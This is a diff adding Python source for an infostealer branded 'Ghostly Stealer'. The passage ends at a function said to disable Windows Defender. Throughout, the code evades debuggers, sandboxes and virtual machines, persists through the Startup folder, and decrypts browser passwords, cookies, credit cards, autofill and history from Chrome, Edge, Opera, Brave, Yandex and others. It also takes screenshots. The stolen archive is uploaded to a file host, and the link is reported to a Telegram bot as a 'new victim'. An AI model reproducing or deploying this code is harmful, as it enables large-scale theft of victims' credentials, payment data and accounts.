+        if title.value.decode('Windows-1252').lower() in {'proxifier', 'graywolf', 'extremedumper', 'zed', 'exeinfope', 'dnspy', 'titanHide', 'ilspy', 'titanhide', 'x32dbg', 'codecracker', 'simpleassembly', 'process hacker 2', 'pc-ret', 'http debugger', 'Centos', 'process monitor', 'debug', 'ILSpy', 'reverse', 'simpleassemblyexplorer', 'process', 'de4dotmodded', 'dojandqwklndoqwd-x86', 'sharpod', 'folderchangesview', 'fiddler', 'die', 'pizza', 'crack', 'strongod', 'ida -', 'brute', 'dump', 'StringDecryptor', 'wireshark', 'debugger', 'httpdebugger', 'gdb', 'kdb', 'x64_dbg', 'windbg', 'x64netdumper', 'petools', 'scyllahide', 'megadumper', 'reversal', 'ksdumper v1.1 - by equifox', 'dbgclr', 'HxD', 'monitor', 'peek', 'ollydbg', 'ksdumper', 'http', 'cse pro', 'dbg', 'httpanalyzer', 'httpdebug', 'PhantOm', 'kgdb', 'james', 'x32_dbg', 'proxy', 'phantom', 'mdbg', 'WPE PRO', 'system explorer', 'de4dot', 'x64dbg', 'X64NetDumper', 'protection_id', 'charles', 'systemexplorer', 'pepper', 'hxd', 'procmon64', 'MegaDumper', 'ghidra', 'xd', '0harmony', 'dojandqwklndoqwd', 'hacker', 'process hacker', 'SAE', 'mdb', 'checker', 'harmony', 'Protection_ID', 'PETools', 'scyllaHide', 'x96dbg', 'systemexplorerservice', 'folder', 'mitmproxy', 'dbx', 'sniffer', 'http toolkit', 'george', 'ABBY'}:
+            pid = ctypes.c_ulong(0)
+            ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
+            if pid.value != 0:
+                try:
+                    handle = ctypes.windll.kernel32.OpenProcess(1, False, pid)
+                    ctypes.windll.kernel32.TerminateProcess(handle, -1)
+                    ctypes.windll.kernel32.CloseHandle(handle)
+                except:
+                    pass
+            exit_program(f'Debugger Open, Type: {title.value.decode("utf-8")}')
+        return True
+
+    while True:
+        ctypes.windll.user32.EnumWindows(winEnumHandler, None)
+        time.sleep(0.5)
+def check_ip():
+    blacklisted = {'88.132.227.238', '79.104.209.33', '92.211.52.62', '20.99.160.173', '188.105.91.173', '64.124.12.162', '195.181.175.105', '194.154.78.160',  '109.74.154.92', '88.153.199.169', '34.145.195.58', '178.239.165.70', '88.132.231.71', '34.105.183.68', '195.74.76.222', '192.87.28.103', '34.141.245.25', '35.199.6.13', '34.145.89.174', '34.141.146.114', '95.25.204.90', '87.166.50.213', '193.225.193.201', '92.211.55.199', '35.229.69.227', '104.18.12.38', '88.132.225.100', '213.33.142.50', '195.239.51.59', '34.85.243.241', '35.237.47.12', '34.138.96.23', '193.128.114.45', '109.145.173.169', '188.105.91.116', 'None', '80.211.0.97', '84.147.62.12', '78.139.8.50', '109.74.154.90', '34.83.46.130', '212.119.227.167', '92.211.109.160', '93.216.75.209', '34.105.72.241', '212.119.227.151', '109.74.154.91', '95.25.81.24', '188.105.91.143', '192.211.110.74', '34.142.74.220', '35.192.93.107', '88.132.226.203', '34.85.253.170', '34.105.0.27', '195.239.51.3', '192.40.57.234', '92.211.192.144', '23.128.248.46', '84.147.54.113', '34.253.248.228','35.185.226.17','104.198.155.173',None}    
+    while True:
+        try:
+            ip = urllib.request.urlopen('https://checkip.amazonaws.com').read().decode().strip()
+            if ip in blacklisted:
+                exit_program('Blacklisted IP Detected')
+            return
+        except:
+            pass
+
+def check_registry():
+    try:
+        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\CurrentControlSet\Enum\IDE', 0, winreg.KEY_READ)
+        subkey_count = winreg.QueryInfoKey(key)[0]
+        for i in range(subkey_count):
+            subkey = winreg.EnumKey(key, i)
+            if subkey.startswith('VMWARE'):
+                exit_program('VM Detected')
+        winreg.CloseKey(key)
+    except:
+        pass
+def makedir():
+    username = os.getenv("USERNAME")
+    upload_folder = os.path.join(temp, "Ghostly_"+username)
+    os.makedirs(upload_folder, exist_ok=True)
+
+
+def getip():
+    ip = "None"
+    try:
+        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
+    except:
+        pass
+    return ip
+
+def globalInfo():
+    try: 
+        ip = getip()
+        username = os.getenv("USERNAME")
+        ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}')
+
+        ipdata = loads(ipdatanojson)
+        contry = ipdata["country_name"]
+
+        globalinfo = f"🌏Ip: {ip}\n🌏Country: {contry}"
+    except: return f"🌏Ip: {ip}\n🌏Country: Cant Get Country."
+if getattr(sys, 'frozen', False):
+    currentFilePath = os.path.dirname(sys.executable)
+else:
+    currentFilePath = os.path.dirname(os.path.abspath(__file__))
+
+fileName = os.path.basename(sys.argv[0])
+filePath = os.path.join(currentFilePath, fileName)
+
+startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+startupFilePath = os.path.join(startupFolderPath, fileName)
+
+if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower():
+    with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
+        shutil.copyfileobj(src_file, dst_file)
+
+
+class DATA_BLOB(Structure):
+    _fields_ = [
+        ('cbData', wintypes.DWORD),
+        ('pbData', POINTER(c_char))
+    ]
+def Getdata (blob_out ):#line:1
+    cbData = int(blob_out.cbData)
+    pbData = blob_out.pbData
+    buffer = c_buffer(cbData)
+    cdll.msvcrt.memcpy(buffer, pbData, cbData)
+    windll.kernel32.LocalFree(pbData)
+    return buffer.raw
+def Creeper(encrypted_bytes, entropy=b''):
+    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
+    buffer_entropy = c_buffer(entropy, len(entropy))
+    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
+    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
+    blob_out = DATA_BLOB()
+
+    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
+        return Getdata(blob_out)
+
+def Decreeper(buff, master_key=None):
+    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
+    if starts == 'v10' or starts == 'v11':
+        iv = buff[3:15]
+        payload = buff[15:]
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        decrypted_pass = cipher.decrypt(payload)
+        decrypted_pass = decrypted_pass[:-16].decode()
+        return decrypted_pass
+
+
+def writefolder(data,name):
+    pathss = os.getenv("TEMP") + f"\\gh{name}.txt"
+    with open(pathss, mode='w', encoding='utf-8') as f:
+        art =f"""
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣾⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⠿⢿⣿⣿⣿⣿⣆⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⠁⠀⠿⢿⣿⡿⣿⣿⡆⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣦⣤⣴⣿⠃⠀⠿⣿⡇⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⡿⠋⠁⣿⠟⣿⣿⢿⣧⣤⣴⣿⡇⠀
+⠀⠀⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠘⠁⢸⠟⢻⣿⡿⠀⠀
+⠀⠀⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣴⣇⢀⣤⠀⠀⠀⠀⠘⣿⠃⠀⠀
+⠀⠀⠀⠀⠀⢈⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣴⣿⢀⣴⣾⠇⠀⠀⠀
+⠀⠀⣀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀
+⠀⠀⠉⠉⠉⠉⣡⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃   Ghostly Stealer x CNTD
+⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⡿⠟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀  t.me/thiendangg
+⠀⠀⣴⡾⠿⠿⠿⠛⠋⠉⠀⢸⣿⣿⣿⣿⠿⠋⢸⣿⡿⠋⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡿⠟⠋⠁⠀⠀⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+"""
+        f.write(f"{art}\n\n")
+        for line in data:
+            if line[0] != '':
+                f.write(f"{line}\n")
+    for idx, name in enumerate(['passwords', 'cookies','creditcards','autofill','history'], start=1):
+        try:
+            pathss = os.getenv("TEMP") + f"\\gh{name}.txt"
+            destination_folder = os.path.join(temp, "Ghostly_"+username, "Credentials")  # Thư mục đích
+            os.makedirs(destination_folder, exist_ok=True)
+            new_filename = f"Data-{idx}_{name}.txt"  # Đặt tên mới cho tệp
+            shutil.move(pathss, os.path.join(destination_folder, new_filename))
+            try:
+                os.remove(pathss)
+            except:pass
+        except Exception:
+            pass
+def writesystem(data):
+    pathss = os.getenv("TEMP") + f"\\ghSystemInfo.txt"
+    with open(pathss, mode='w', encoding='utf-8') as f:
+        art =f"""
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣾⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⠿⢿⣿⣿⣿⣿⣆⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⠁⠀⠿⢿⣿⡿⣿⣿⡆⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣦⣤⣴⣿⠃⠀⠿⣿⡇⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⡿⠋⠁⣿⠟⣿⣿⢿⣧⣤⣴⣿⡇⠀
+⠀⠀⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠘⠁⢸⠟⢻⣿⡿⠀⠀
+⠀⠀⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣴⣇⢀⣤⠀⠀⠀⠀⠘⣿⠃⠀⠀
+⠀⠀⠀⠀⠀⢈⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣴⣿⢀⣴⣾⠇⠀⠀⠀
+⠀⠀⣀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀
+⠀⠀⠉⠉⠉⠉⣡⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃   Ghostly Stealer x CNTD
+⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⡿⠟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀  t.me/thiendangg
+⠀⠀⣴⡾⠿⠿⠿⠛⠋⠉⠀⢸⣿⣿⣿⣿⠿⠋⢸⣿⡿⠋⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡿⠟⠋⠁⠀⠀⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+"""
+        f.write(f"{art}\n\n")
+        f.write(data)
+    destination_folders = os.path.join(temp, "Ghostly_"+username, "System")  # Thư mục đích
+    os.makedirs(destination_folders, exist_ok=True)
+    pathsss = os.getenv("TEMP") + "\\ghSystemInfo.txt"
+    new_filenamea = "SystemInfo.txt"  # Đặt tên mới cho tệp
+    shutil.move(pathsss, os.path.join(destination_folders, new_filenamea))
+    try:os.remove(pathss)
+    except:pass
+keyword = ['mail', 'coinbase', 'sellix', 'gmail', 'steam', 'discord', 'riotgames', 'youtube', 'instagram', 'tiktok', 'twitter', 'facebook', 'card', 'epicgames', 'spotify', 'yahoo', 'roblox', 'twitch', 'minecraft', 'bank', 'paypal', 'origin', 'amazon', 'ebay', 'aliexpress', 'playstation', 'hbo', 'xbox', 'buy', 'sell', 'binance', 'hotmail', 'outlook', 'crunchyroll', 'telegram', 'pornhub', 'disney', 'expressvpn', 'crypto', 'uber', 'netflix','garena']
+CookiCount, PassCount,CreCount,AutofillCount,Hiscount = 0, 0, 0, 0, 0
+cookiWords = []
+paswWords = []
+Pass,Cookie,Cre,Autofill,History = [], [], [], [], []
+def getpass(path, arg):
+    try:
+        global Pass, PassCount
+        if not os.path.exists(path): return
+
+        pathC = path + arg + "/Login Data"
+        if os.stat(pathC).st_size == 0: return
+
+        tempfold = temp + "gh" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+
+        shutil.copy2(pathC, tempfold)
+        conn = sql_connect(tempfold)
+        cursor = conn.cursor()
+        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+        data = cursor.fetchall()
+
+        pathKey = path + "/Local State"
+        with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
+        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
+        master_key = Creeper(master_key[5:])
+        for row in data: 
+            if row[0] != '':
+                for wa in keyword:
+                    if wa in row[0]:
+                        paswWords.append(wa)
+
+                Pass.append(f"Site: {row[0]}\nUser: {row[1]}\nPass: {Decreeper(row[2], master_key)}\n")
+                PassCount += 1
+        writefolder(Pass, 'passwords')
+        cursor.close()
+        conn.close()
+        os.remove(tempfold)
+    except:pass  
+def getcookie(path, arg):
+    try:
+        global Cookie, CookiCount
+        if not os.path.exists(path): return
+        
+        pathC = path + arg + "/Cookies"
+        if os.stat(pathC).st_size == 0: return
+        
+        tempfold = temp + "gh" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+        
+        shutil.copy2(pathC, tempfold)
+        conn = sql_connect(tempfold)
+        cursor = conn.cursor()
+        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
+        data = cursor.fetchall()
+
+        pathKey = path + "/Local State"
+        with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
+        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
+        master_key = Creeper(master_key[5:])
+
+        for row in data: 
+            if row[0] != '':
+                for wa in keyword:
+                    if wa in row[0]:
+                        cookiWords.append(wa)
+
+                Cookie.append(f"{row[0]}	TRUE	/	FALSE	2597573456	{row[1]}	{Decreeper(row[2], master_key)}")
+                CookiCount += 1
+        writefolder(Cookie, 'cookies')
+        cursor.close()
+        conn.close()
+        os.remove(tempfold)
+    except:pass
+def getcre(path, arg):
+    try:
+        global Cre, CreCount
+        if not os.path.exists(path): return
+
+        pathC = path + arg + "/Web Data"
+        if os.stat(pathC).st_size == 0: return
+
+        tempfold = temp + "gh" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+        shutil.copy2(pathC, tempfold)
+        conn = sql_connect(tempfold)
+        cursor = conn.cursor()
+        cursor.execute("SELECT * FROM credit_cards ")
+        data = cursor.fetchall()
+
+        pathKey = path + "/Local State"
+        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
+        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
+        master_key = Creeper(master_key[5:])
+
+        for row in data:
+            if row[0] != '':
+                Cre.append(f"Card Name: {row[1]} | Numbers: {Decreeper(row[4], master_key)} | Expiry: {row[2]}/{row[3]}")
+                CreCount += 1
+        writefolder(Cre, 'creditcards')
+        cursor.close()
+        conn.close()
+        os.remove(tempfold)
+    except:pass
+def getatfil(path, arg):
+    try:
+        global Autofill, AutofillCount
+        if not os.path.exists(path): return
+
+        pathC = path + arg + "/Web Data"
+        if os.stat(pathC).st_size == 0: return
+
+        tempfold = temp + "gh" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+        shutil.copy2(pathC, tempfold)
+        conn = sql_connect(tempfold)
+        cursor = conn.cursor()
+        cursor.execute("SELECT * FROM autofill WHERE value NOT NULL")
+        data = cursor.fetchall()
+        for row in data:
+            if row[0] != '':
+                Autofill.append(f"Name: {row[0]} | Value: {row[1]}")
+                AutofillCount += 1
+        writefolder(Autofill, 'autofill')
+        cursor.close()
+        conn.close()
+        os.remove(tempfold)
+    except:pass
+def gethis(path, arg):
+    try:
+        global History, Hiscount
+        if not os.path.exists(path): return
+
+        pathC = path + arg + "History"
+        if os.stat(pathC).st_size == 0: return
+        tempfold = temp + "gh" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+        shutil.copy2(pathC, tempfold)
+        conn = sql_connect(tempfold)
+        cursor = conn.cursor()
+        cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls')
+        data = cursor.fetchall()
+        for row in data:
+            if not row[0] or not row[1] or not row[2]:
+                History.append(f"Url: {row[0]}\nTitle: {row[1]}\nVisited: {row[2]}\nLast Visited: {row[3]}\n")
+                Hiscount += 1
+        writefolder(History, 'history')
+        cursor.close()
+        conn.close()
+        os.remove(tempfold)
+    except:pass
+def StealSystemInfo():
+    process = subprocess.run("systeminfo", capture_output=True, shell=True)
+    output1 = process.stdout.decode(errors="ignore").strip().replace("\r\n", "\n")
+    if output1:
+        lines = output1.split('\n')
+        system_info = {}
+        for line in lines:
+            parts = line.split(':')
+            if len(parts) == 2:
+                key = parts[0].strip()
+                value = parts[1].strip()
+                system_info[key] = value
+        data = '\n'.join([f"{key}: {value}" for key, value in system_info.items()])
+        writesystem(data)
+def kill_browser_processes(process_name):
+    for process in psutil.process_iter():
+        try:
+            if process.name() == process_name:
+                process.kill()
+        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+            pass
+Threadlist = []
+def GatherAll():
+    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >                     Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
+    browserPaths = [    
+        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
+        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
+        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
+        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
+        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 1/Local Storage/leveldb", "/Profile 1/",   "/Profile 1/Network",   "/Profile 1/Local Extension Settings/"            ],
+        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 2/Local Storage/leveldb", "/Profile 2/",   "/Profile 2/Network",   "/Profile 2/Local Extension Settings/"            ],
+        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 3/Local Storage/leveldb", "/Profile 3/",   "/Profile 3/Network",   "/Profile 3/Local Extension Settings/"            ],
+        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 4/Local Storage/leveldb", "/Profile 4/",   "/Profile 4/Network",   "/Profile 4/Local Extension Settings/"            ],
+        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 5/Local Storage/leveldb", "/Profile 5/",   "/Profile 5/Network",   "/Profile 5/Local Extension Settings/"            ],
+        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 6/Local Storage/leveldb", "/Profile 6/",   "/Profile 6/Network",   "/Profile 6/Local Extension Settings/"            ],
+        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 7/Local Storage/leveldb", "/Profile 7/",   "/Profile 7/Network",   "/Profile 7/Local Extension Settings/"            ],
+        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 8/Local Storage/leveldb", "/Profile 8/",   "/Profile 8/Network",   "/Profile 8/Local Extension Settings/"            ],
+        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 9/Local Storage/leveldb", "/Profile 9/",   "/Profile 9/Network",   "/Profile 9/Local Extension Settings/"            ],
+        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Profile 10/Local Storage/leveldb","/Profile 10/",  "/Profile 10/Network",  "/Profile 10/Local Extension Settings/"           ],
+        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
+        [f"{local}/Google/Chrome Beta/User Data",                   "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
+        [f"{local}/Google/Chrome Dev/User Data",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
+        [f"{local}/Google/Chrome Unstable/User Data",               "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
+        [f"{local}/Google/Chrome Canary/User Data",                 "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
+        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",        "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
+        [f"{local}/Vivaldi/User Data",                              "vivaldi.exe",      "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
+        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
+        [f"{local}/Yandex/YandexBrowserCanary/User Data",           "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
+        [f"{local}/Yandex/YandexBrowserDeveloper/User Data",        "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
+        [f"{local}/Yandex/YandexBrowserBeta/User Data",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
+        [f"{local}/Yandex/YandexBrowserTech/User Data",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
+        [f"{local}/Yandex/YandexBrowserSxS/User Data",              "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
+        [f"{local}/Microsoft/Edge/User Data",                       "msedge.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
+        [f"{local}/CocCoc/Browser/User Data",                       "browser.exe",      "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
+        [f"{local}/CocCoc/Browser/User Data",                       "browser.exe",      "/Profile 1/Local Storage/leveldb",   "/Profile 1/", "/Profile 1/Network",     "/Profile 1/Local Extension Settings/"          ],
+        [f"{local}/CocCoc/Browser/User Data",                       "browser.exe",      "/Profile 2/Local Storage/leveldb",   "/Profile 2/", "/Profile 2/Network",     "/Profile 2/Local Extension Settings/"          ],
+        [f"{local}/CocCoc/Browser/User Data",                       "browser.exe",      "/Profile 3/Local Storage/leveldb",   "/Profile 3/", "/Profile 3/Network",     "/Profile 3/Local Extension Settings/"          ],
+        [f"{local}/CocCoc/Browser/User Data",                       "browser.exe",      "/Profile 4/Local Storage/leveldb",   "/Profile 4/", "/Profile 4/Network",     "/Profile 4/Local Extension Settings/"          ],
+        [f"{local}/CocCoc/Browser/User Data",                       "browser.exe",      "/Profile 5/Local Storage/leveldb",   "/Profile 5/", "/Profile 5/Network",     "/Profile 5/Local Extension Settings/"          ],
+        [f"{local}/CocCoc/Browser/User Data",                       "browser.exe",      "/Profile 6/Local Storage/leveldb",   "/Profile 6/", "/Profile 6/Network",     "/Profile 6/Local Extension Settings/"          ],
+        [f"{local}/CocCoc/Browser/User Data",                       "browser.exe",      "/Profile 7/Local Storage/leveldb",   "/Profile 7/", "/Profile 7/Network",     "/Profile 7/Local Extension Settings/"          ],
+        [f"{local}/CocCoc/Browser/User Data",                       "browser.exe",      "/Profile 8/Local Storage/leveldb",   "/Profile 8/", "/Profile 8/Network",     "/Profile 8/Local Extension Settings/"          ],
+        [f"{local}/CocCoc/Browser/User Data",                       "browser.exe",      "/Profile 9/Local Storage/leveldb",   "/Profile 9/", "/Profile 9/Network",     "/Profile 9/Local Extension Settings/"          ],
+        [f"{local}/CocCoc/Browser/User Data",                       "browser.exe",      "/Profile 10/Local Storage/leveldb",  "/Profile 10/","/Profile 10/Network",     "/Profile 10/Local Extension Settings/"        ]
+    ]
+    browserProcesses = ["opera.exe", "chrome.exe", "brave.exe", "vivaldi.exe", "yandex.exe", "msedge.exe", "browser.exe"]
+    for process_info in browserPaths:
+        process_name = process_info[1]
+        if process_name in browserProcesses:
+            kill_browser_processes(process_name)
+    for patt in browserPaths: 
+        pass_thread = threading.Thread(target=getpass, args=[patt[0], patt[3]])
+        atfil_thread = threading.Thread(target=getatfil, args=[patt[0], patt[3]])
+        cre_thread = threading.Thread(target=getcre, args=[patt[0], patt[3]])
+        his_thread = threading.Thread(target=gethis, args=[patt[0], patt[3]])
+
+        his_thread.start()
+        pass_thread.start()
+        atfil_thread.start()
+        cre_thread.start()
+
+        Threadlist.append(his_thread)
+        Threadlist.append(pass_thread)
+        Threadlist.append(atfil_thread)
+        Threadlist.append(cre_thread)
+    for thread in Threadlist:thread.join()
+
+    ThCokk = []
+    for patt in browserPaths: 
+        a = threading.Thread(target=getcookie, args=[patt[0], patt[4]])
+        a.start()
+        ThCokk.append(a)
+    for thread in ThCokk: thread.join()
+
+    System = []
+    b = threading.Thread(target=StealSystemInfo)
+    b.start()
+    System.append(b)
+    for thread in System: thread.join()
+def get_mac_address():
+    for interface, addrs in psutil.net_if_addrs().items():
+        if interface == "Wi-Fi":
+            for addr in addrs:
+                if addr.family == psutil.AF_LINK:
+                    mac = addr.address
+                    return mac
+
+def machineinfo():
+    totalMemory = subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()
+    totalMemory = (str(int(int(totalMemory[1])/1000000000)) + " GB") if len(totalMemory) >= 1 else "Unable to detect total memory"
+    c = wmi.WMI()
+    for gpu in c.Win32_DisplayConfiguration():
+        GPUm = gpu.Description.strip()
+
+    current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()     
+    mac = get_mac_address()
+    result = f"💻Username: {username.upper()}\n💻Ram: {totalMemory}\n💻GPU: {GPUm}\n💻Mac: {mac}\n💻UID: {current_machine_id}\n"
+    return result
+def capture():
+    temp_photo_path = f"{temp}/screenshot.png"
+    screenshot = pyautogui.screenshot()
+    screenshot.save(temp_photo_path)
+    shutil.move(temp_photo_path, os.path.join(temp, "Ghostly_"+username))
+    try:
+        os.remove(temp_photo_path)
+    except:pass
+
+def upload_to_gofile(zip_file_name):
+    try:
+        response = requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(zip_file_name, 'rb')})
+        if response.status_code == 200:
+            download_page_url = response.json()["data"]["downloadPage"]
+            return download_page_url
+        else:
+            return None
+    except Exception as e:
+        return None
+
+def send_telegram_message(link):
+    globalinfo = globalInfo()
+    machineinf = machineinfo()
+    text = f"Ghostly Stealer Found A New Victim !\n\n{globalinfo}\n{machineinf}🌐Cookies Found: {CookiCount}\n🌐Passwords Found: {PassCount}\n🌐Histories Found: {Hiscount}\n🌐Autofills Found: {AutofillCount}\n🌐CreditCards Found: {CreCount}\n\nLink Download Data:{link}"
+    bot.send_message(chat_id=chatyd, text=text, parse_mode="HTML")
+def DisableDefender(): # Tries to disable the defender
